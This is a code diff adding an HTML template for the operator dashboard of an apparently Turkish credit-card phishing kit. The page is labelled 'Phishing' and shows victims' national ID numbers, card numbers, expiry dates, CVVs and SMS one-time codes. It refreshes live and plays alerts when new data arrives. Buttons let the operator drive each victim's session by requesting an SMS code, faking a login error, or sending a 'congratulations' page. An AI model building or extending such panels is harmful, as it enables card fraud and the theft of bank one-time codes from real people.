@@ -1,0 +1,142 @@
+{% extends "admin/layout.html" %}
+{% block title %}Log Tablosu - CHANTE ADMIN SYSTEM{% endblock %}
+{% block head_scripts %}
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      setInterval(function() {
+        if (globalThis.jQuery) {
+          const baseUrl = globalThis.location.href.split('?')[0] + ' #tablo';
+          globalThis.jQuery('#tablo').load(baseUrl);
+        }
+      }, 3000);
+    });
+  </script>
+{% endblock %}
+{% block content %}
+  <div class="page-header">
+    <h1 class="page-title">Log Tablosu</h1>
+    <div>
+      <ol class="breadcrumb">
+        <li class="breadcrumb-item"><a href="{{ url_for('admin.dashboard') }}">Phishing</a></li>
+        <li class="breadcrumb-item active" aria-current="page">Log Tablosu</li>
+      </ol>
+    </div>
+  </div>
+  {% if card_sound %}
+    <audio autoplay>
+      <source src="{{ url_for('admin.static', filename='chante1.mp3') }}" type="audio/mpeg">
+    </audio>
+  {% endif %}
+  {% if sms_sound %}
+    <audio autoplay>
+      <source src="{{ url_for('admin.static', filename='chante2.mp3') }}" type="audio/mpeg">
+    </audio>
+  {% endif %}
+  <div class="row">
+    <div class="col-xl-12">
+      <div class="card">
+        <div class="card-body">
+          <div id="tablo" class="table-responsive">
+            <table class="table border text-nowrap text-md-nowrap table-borderless mb-0">
+              <thead>
+                <tr>
+                  <th class="text-nowrap">DURUM</th>
+                  <th>TC KİMLİK NO</th>
+                  <th>KREDİ KARTI</th>
+                  <th>SKT</th>
+                  <th>CVV</th>
+                  <th>SMS</th>
+                  <th class="text-nowrap">TOPLAM LİMİT</th>
+                  <th class="text-nowrap">GÜNCEL LİMİT</th>
+                  <th class="text-nowrap">IP ADRESİ</th>
+                  <th class="text-nowrap">TARİH</th>
+                  <th class="text-nowrap">İŞLEM</th>
+                </tr>
+              </thead>
+              <tbody>
+                {% for log in logs %}
+                  <tr>
+                    <td>
+                      <span class="badge rounded-pill bg-danger">#{{ log.id }}</span>
+                      <span class="badge rounded-pill bg-secondary">{{ log.now }}</span>
+                      <span class="badge rounded-pill bg-primary">{{ log.banka or 'Banka Bilinmiyor' }}</span><br>
+                      <span class="badge rounded-pill bg-info">{{ log.cihaz }}</span>
+                      <span class="badge rounded-pill bg-warning">{{ log.tarayici }}</span>
+                    </td>
+                    <td>{{ log.tc }}</td>
+                    <td>{{ log.kk }}</td>
+                    <td>{{ log.sonkul }}</td>
+                    <td>{{ log.cvv }}</td>
+                    <td>{{ log.sms }}</td>
+                    <td>{{ log.toplam_limit or 0 }} TL</td>
+                    <td>{{ log.guncel_limit or log.kartlimit or 0 }} TL</td>
+                    <td>
+                      {{ log.ip }}
+                      {% if log.lastOnline and log.lastOnline > current_ts %}
+                        <i class="fa-solid fa-signal text-success"></i>
+                      {% else %}
+                        <i class="fa-solid fa-signal text-danger"></i>
+                      {% endif %}
+                    </td>
+                    <td>{{ log.date }}</td>
+                    <td>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="back">
+                        <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="Geri gönder" aria-label="Geri gönder" type="submit">
+                          <i class="fa-solid fa-arrow-rotate-left"></i>
+                        </button>
+                      </form>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="sms">
+                        <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="SMS iste" aria-label="SMS iste" type="submit">
+                          <i class="fa-solid fa-comment-sms"></i>
+                        </button>
+                      </form>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="tebrik">
+                        <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="Tebrik gönder" aria-label="Tebrik gönder" type="submit">
+                          <i class="fa-solid fa-circle-check"></i>
+                        </button>
+                      </form>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="ban">
+                        <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="Banla" aria-label="Banla" type="submit">
+                          <i class="fa-solid fa-ban"></i>
+                        </button>
+                      </form>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="delete">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="Sil" aria-label="Sil" type="submit">
+                          <i class="fa-solid fa-trash"></i>
+                        </button>
+                      </form>
+                      <form method="post" class="d-inline">
+                        <input type="hidden" name="action" value="hata1">
+                        <input type="hidden" name="target_ip" value="{{ log.ip }}">
+                        <input type="hidden" name="log_id" value="{{ log.id }}">
+                        <button class="btn btn-sm btn-danger-gradient mb-1" title="Giriş hatası" aria-label="Giriş hatası" type="submit">
+                          <i class="fa-solid fa-comment-slash"></i>
+                        </button>
+                      </form>
+                    </td>
+                  </tr>
+                {% else %}
+                  <tr><td colspan="11" class="text-center">Henüz log kaydı alınmadı.</td></tr>
+                {% endfor %}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+{% endblock %}
